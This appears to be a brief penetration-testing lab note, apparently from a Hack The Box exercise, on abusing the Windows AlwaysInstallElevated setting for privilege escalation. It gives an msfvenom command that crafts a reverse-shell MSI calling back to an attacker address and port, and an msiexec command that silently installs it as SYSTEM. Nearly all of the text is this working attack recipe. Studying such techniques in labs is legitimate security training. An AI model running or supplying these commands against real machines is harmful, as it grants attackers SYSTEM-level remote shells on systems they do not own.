***
This settings allow the installation of software with elevated users
-> can be used to obtain elevated privilege by crafting a malicious msi

**Crafting msi**
```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=4242 -f msi > notashell.msi
```

**Installing msi as SYSTEM**
```
msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart
```

![[priv-esc.png]]
